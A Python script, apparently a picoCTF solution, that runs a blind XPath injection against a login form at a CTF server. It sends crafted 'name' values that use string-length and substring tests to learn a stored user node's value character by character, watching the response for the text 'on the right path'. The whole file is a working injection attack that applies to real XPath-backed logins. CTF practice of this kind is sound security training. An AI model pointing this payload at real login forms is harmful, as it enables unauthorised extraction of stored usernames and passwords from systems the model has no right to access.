import requests
import string
import sys


def getLengthOfChildNode(user_position, node_position):
    length=0
    for i in range(100):
        payload = {'name': f"' or string-length(//user[position()={user_position}]/child::node()[position()={node_position}])={i} or ''='", 'pass': 'test'}
        try:
            r = requests.post(URL, data=payload, timeout=2)
        except:
            continue
        if 'on the right path' in r.text:
            length = i
            print("[+] Determined length of node value:", length)
            break
        else:
            print(f"Tried {i}, failed.")
    return length



def getContentOfChildNode(user_position, node_position,length):
    stringContent=""
    characters = string.ascii_letters + string.digits + '{}_()'
    #a-z A-Z 0-9 {}_()
    #characters ="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_()"
    for i in range(1, length + 1):
        #XPATH position starts from 1
        for char in characters:
            data = {'name': f"' or substring((//user[position()={user_position}]/child::node()[position()={node_position}]),{i},1)='{char}' or ''='", 'pass': 'test'}
            try:
                r = requests.post(URL, data=data, timeout=2)
            except:
                continue
            if 'on the right path' in r.text:
                print(f"[+] Found character at position {i}:", char)
                stringContent+=char
                break
    return stringContent


if __name__ == '__main__':

    URL = 'http://mercury.picoctf.net:53735/'
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} USER_POSITION NODE_POSITION")
        sys.exit()
    user_position, node_position = sys.argv[1:]
    print("Attempting injection...")
    print("Obtaining child node string length...")
    len = getLengthOfChildNode(user_position, node_position)
    print("Obtaining value...")
    childNode = getContentOfChildNode(user_position, node_position,len)
    if "pico" in childNode:
        print(childNode)
